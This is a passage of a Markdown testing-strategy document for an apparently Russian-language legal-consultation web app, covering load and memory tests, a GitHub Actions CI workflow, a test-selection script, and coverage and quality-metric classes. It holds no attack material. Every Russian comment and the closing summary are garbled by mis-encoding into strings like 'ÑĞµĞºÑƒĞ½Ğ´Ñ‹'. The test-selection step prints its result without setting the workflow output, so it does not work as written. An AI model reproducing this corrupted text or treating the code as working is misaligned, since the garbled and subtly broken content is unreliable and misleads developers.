    performanceMonitor = new PerformanceMonitor();
  });

  describe('Load Testing', () => {
    it('should handle concurrent users', async () => {
      // Arrange
      const loadTestConfig = {
        target: 'http://localhost:3000',
        users: 100,
        duration: '5m',
        rampUp: '1m'
      };

      // Act
      const results = await loadTester.runLoadTest(loadTestConfig);

      // Assert
      expect(results.responseTime.p95).toBeLessThan(2000); // 2 ÑĞµĞºÑƒĞ½Ğ´Ñ‹
      expect(results.errorRate).toBeLessThan(1); // 1%
      expect(results.throughput).toBeGreaterThan(50); // 50 RPS
    });

    it('should handle AI consultation load', async () => {
      // Arrange
      const aiLoadTestConfig = {
        target: 'http://localhost:3000/api/legal/consultation',
        users: 50,
        duration: '3m',
        scenario: 'ai_consultation'
      };

      // Act
      const results = await loadTester.runLoadTest(aiLoadTestConfig);

      // Assert
      expect(results.responseTime.p95).toBeLessThan(10000); // 10 ÑĞµĞºÑƒĞ½Ğ´ Ğ´Ğ»Ñ AI
      expect(results.errorRate).toBeLessThan(2); // 2% Ğ´Ğ»Ñ AI
    });
  });

  describe('Stress Testing', () => {
    it('should handle peak load', async () => {
      // Arrange
      const stressTestConfig = {
        target: 'http://localhost:3000',
        users: 500,
        duration: '10m',
        rampUp: '2m'
      };

      // Act
      const results = await loadTester.runStressTest(stressTestConfig);

      // Assert
      expect(results.systemStability).toBe(true);
      expect(results.recoveryTime).toBeLessThan(30000); // 30 ÑĞµĞºÑƒĞ½Ğ´
    });
  });

  describe('Memory Testing', () => {
    it('should not have memory leaks', async () => {
      // Arrange
      const memoryTestConfig = {
        target: 'http://localhost:3000',
        duration: '30m',
        memoryThreshold: 512 * 1024 * 1024 // 512MB
      };

      // Act
      const results = await performanceMonitor.monitorMemory(memoryTestConfig);

      // Assert
      expect(results.memoryLeaks).toHaveLength(0);
      expect(results.peakMemoryUsage).toBeLessThan(memoryTestConfig.memoryThreshold);
    });
  });
});
```

---

## ğŸš€ Continuous Testing

### **1. CI/CD Integration**

#### **GitHub Actions Workflow**
```yaml
# .github/workflows/continuous-testing.yml
name: Continuous Testing

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test-selection:
    runs-on: ubuntu-latest
    outputs:
      test-suite: ${{ steps.select.outputs.test-suite }}
    steps:
      - uses: actions/checkout@v4
      - name: Select Tests
        id: select
        run: |
          # AI-powered test selection
          node scripts/select-tests.js ${{ github.event.head_commit.id }}

  unit-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Run unit tests
        run: npm run test:unit -- --reporter=json --outputFile=test-results.json
      - name: Upload coverage
        uses: codecov/codecov-action@v3

  integration-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Run integration tests
        run: npm run test:integration

  e2e-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Install Playwright
        run: npx playwright install
      - name: Run E2E tests
        run: npm run test:e2e
      - name: Upload test results
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: playwright-report
          path: playwright-report/

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run security tests
        run: |
          npm run test:security
          npm audit --audit-level=moderate
      - name: Upload security report
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: security-report.json

  performance-tests:
    needs: test-selection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm ci
      - name: Run performance tests
        run: npm run test:performance
      - name: Upload performance report
        uses: actions/upload-artifact@v3
        with:
          name: performance-report
          path: performance-report.json
```

### **2. Test Automation**

#### **Automated Test Execution**
```typescript
// scripts/select-tests.js
import { IntelligentTestSelector } from './lib/testing/intelligent-test-selector';
import { ChangeAnalyzer } from './lib/testing/change-analyzer';

async function selectTests(commitHash) {
  const testSelector = new IntelligentTestSelector();
  const changeAnalyzer = new ChangeAnalyzer();
  
  // ĞĞ½Ğ°Ğ»Ğ¸Ğ·Ğ¸Ñ€ÑƒĞµĞ¼ Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ¸Ñ
  const changes = await changeAnalyzer.analyzeChanges(commitHash);
  
  // Ğ’Ñ‹Ğ±Ğ¸Ñ€Ğ°ĞµĞ¼ Ñ‚ĞµÑÑ‚Ñ‹
  const selectedTests = await testSelector.selectTestsForExecution(changes);
  
  // Ğ’Ñ‹Ğ²Ğ¾Ğ´Ğ¸Ğ¼ Ñ€ĞµĞ·ÑƒĞ»ÑŒÑ‚Ğ°Ñ‚
  console.log(`test-suite=${JSON.stringify(selectedTests)}`);
}

selectTests(process.argv[2]);
```

---

## ğŸ“ˆ Test Metrics and Reporting

### **1. Test Coverage**

#### **Coverage Reporting**
```typescript
// tests/coverage/coverage-reporter.ts
export class CoverageReporter {
  async generateCoverageReport(): Promise<CoverageReport> {
    const coverage = await this.collectCoverage();
    
    return {
      overall: {
        statements: coverage.statements.percentage,
        branches: coverage.branches.percentage,
        functions: coverage.functions.percentage,
        lines: coverage.lines.percentage
      },
      byFile: coverage.files.map(file => ({
        path: file.path,
        statements: file.statements.percentage,
        branches: file.branches.percentage,
        functions: file.functions.percentage,
        lines: file.lines.percentage
      })),
      thresholds: {
        statements: 80,
        branches: 75,
        functions: 80,
        lines: 80
      },
      recommendations: this.generateRecommendations(coverage)
    };
  }

  private generateRecommendations(coverage: any): string[] {
    const recommendations = [];
    
    if (coverage.statements.percentage < 80) {
      recommendations.push('Ğ£Ğ²ĞµĞ»Ğ¸Ñ‡Ğ¸Ñ‚ÑŒ Ğ¿Ğ¾ĞºÑ€Ñ‹Ñ‚Ğ¸Ğµ statements Ğ´Ğ¾ 80%');
    }
    
    if (coverage.branches.percentage < 75) {
      recommendations.push('Ğ£Ğ²ĞµĞ»Ğ¸Ñ‡Ğ¸Ñ‚ÑŒ Ğ¿Ğ¾ĞºÑ€Ñ‹Ñ‚Ğ¸Ğµ branches Ğ´Ğ¾ 75%');
    }
    
    return recommendations;
  }
}
```

### **2. Test Quality Metrics**

#### **Quality Assessment**
```typescript
// tests/quality/quality-metrics.ts
export class TestQualityMetrics {
  async assessTestQuality(): Promise<TestQualityReport> {
    const metrics = await this.collectMetrics();
    
    return {
      testEffectiveness: this.calculateTestEffectiveness(metrics),
      testMaintainability: this.calculateTestMaintainability(metrics),
      testReliability: this.calculateTestReliability(metrics),
      testCoverage: this.calculateTestCoverage(metrics),
      overallScore: this.calculateOverallScore(metrics),
      recommendations: this.generateQualityRecommendations(metrics)
    };
  }

  private calculateTestEffectiveness(metrics: any): number {
    // Ğ Ğ°ÑÑÑ‡Ğ¸Ñ‚Ñ‹Ğ²Ğ°ĞµĞ¼ ÑÑ„Ñ„ĞµĞºÑ‚Ğ¸Ğ²Ğ½Ğ¾ÑÑ‚ÑŒ Ñ‚ĞµÑÑ‚Ğ¾Ğ²
    const bugDetectionRate = metrics.bugsDetected / metrics.totalBugs;
    const falsePositiveRate = metrics.falsePositives / metrics.totalTests;
    
    return (bugDetectionRate * 0.7) + ((1 - falsePositiveRate) * 0.3);
  }

  private calculateTestMaintainability(metrics: any): number {
    // Ğ Ğ°ÑÑÑ‡Ğ¸Ñ‚Ñ‹Ğ²Ğ°ĞµĞ¼ Ğ¿Ğ¾Ğ´Ğ´ĞµÑ€Ğ¶Ğ¸Ğ²Ğ°ĞµĞ¼Ğ¾ÑÑ‚ÑŒ Ñ‚ĞµÑÑ‚Ğ¾Ğ²
    const testComplexity = metrics.cyclomaticComplexity / metrics.totalTests;
    const testDuplication = metrics.duplicatedTests / metrics.totalTests;
    
    return Math.max(0, 1 - (testComplexity * 0.5) - (testDuplication * 0.5));
  }
}
```

---

## ğŸ¯ Ğ—Ğ°ĞºĞ»ÑÑ‡ĞµĞ½Ğ¸Ğµ

Ğ”Ğ°Ğ½Ğ½Ğ°Ñ ÑÑ‚Ñ€Ğ°Ñ‚ĞµĞ³Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ Ğ¾Ğ±ĞµÑĞ¿ĞµÑ‡Ğ¸Ğ²Ğ°ĞµÑ‚:

### **âœ… Ğ¡Ğ¾Ğ²Ñ€ĞµĞ¼ĞµĞ½Ğ½Ñ‹Ğµ Ğ¿Ğ¾Ğ´Ñ…Ğ¾Ğ´Ñ‹ 2025:**
- **AI-Powered Testing** - Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ°Ñ Ğ³ĞµĞ½ĞµÑ€Ğ°Ñ†Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¾Ğ²
- **Intelligent Test Selection** - ÑƒĞ¼Ğ½Ñ‹Ğ¹ Ğ²Ñ‹Ğ±Ğ¾Ñ€ Ñ‚ĞµÑÑ‚Ğ¾Ğ²
- **Continuous Testing** - Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ Ğ½Ğ° Ğ²ÑĞµÑ… ÑÑ‚Ğ°Ğ¿Ğ°Ñ…
- **Security-First Testing** - Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚ĞµÑ‚ Ğ±ĞµĞ·Ğ¾Ğ¿Ğ°ÑĞ½Ğ¾ÑÑ‚Ğ¸

### **âœ… ĞŸĞ¾Ğ»Ğ½Ğ¾Ğµ Ğ¿Ğ¾ĞºÑ€Ñ‹Ñ‚Ğ¸Ğµ:**
- **Unit Tests (70%)** - ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ½ĞµĞ½Ñ‚Ñ‹ Ğ¸ Ğ±Ğ¸Ğ·Ğ½ĞµÑ-Ğ»Ğ¾Ğ³Ğ¸ĞºĞ°
- **Integration Tests (25%)** - API Ğ¸ Ğ±Ğ°Ğ·Ğ° Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…
- **E2E Tests (5%)** - ĞºÑ€Ğ¸Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸Ğµ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒÑĞºĞ¸Ğµ ÑÑ†ĞµĞ½Ğ°Ñ€Ğ¸Ğ¸
- **Security Tests** - SAST, DAST, IAST
- **Performance Tests** - Ğ½Ğ°Ğ³Ñ€ÑƒĞ·Ğ¾Ñ‡Ğ½Ğ¾Ğµ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ

### **âœ… ĞĞ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ:**
- **CI/CD Integration** - Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¾Ğµ Ğ²Ñ‹Ğ¿Ğ¾Ğ»Ğ½ĞµĞ½Ğ¸Ğµ
- **Test Generation** - AI-Ğ³ĞµĞ½ĞµÑ€Ğ°Ñ†Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ñ… ÑĞ»ÑƒÑ‡Ğ°ĞµĞ²
- **Quality Gates** - Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸Ğµ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ĞºĞ¸ ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ°
- **Reporting** - Ğ´ĞµÑ‚Ğ°Ğ»ÑŒĞ½Ğ°Ñ Ğ¾Ñ‚Ñ‡ĞµÑ‚Ğ½Ğ¾ÑÑ‚ÑŒ

**Ğ¡Ğ»ĞµĞ´ÑƒÑÑ‰Ğ¸Ğ¹ ÑˆĞ°Ğ³**: Ğ’Ğ½ĞµĞ´Ñ€ĞµĞ½Ğ¸Ğµ Ñ‚ĞµÑÑ‚Ğ¾Ğ²Ğ¾Ğ¹ Ğ¸Ğ½Ñ„Ñ€Ğ°ÑÑ‚Ñ€ÑƒĞºÑ‚ÑƒÑ€Ñ‹ Ğ¸ Ğ½Ğ°ÑÑ‚Ñ€Ğ¾Ğ¹ĞºĞ° CI/CD! ğŸš€

---

*Ğ¡Ñ‚Ñ€Ğ°Ñ‚ĞµĞ³Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ Ğ¿Ğ¾Ğ´Ğ³Ğ¾Ñ‚Ğ¾Ğ²Ğ»ĞµĞ½Ğ°: 16 Ğ¾ĞºÑ‚ÑĞ±Ñ€Ñ 2025*  
*Ğ’ĞµÑ€ÑĞ¸Ñ: 1.0*  
*Ğ¡Ñ‚Ğ°Ñ‚ÑƒÑ: Ğ“Ğ¾Ñ‚Ğ¾Ğ²Ğ¾ Ğº Ğ²Ğ½ĞµĞ´Ñ€ĞµĞ½Ğ¸Ñ âœ…*
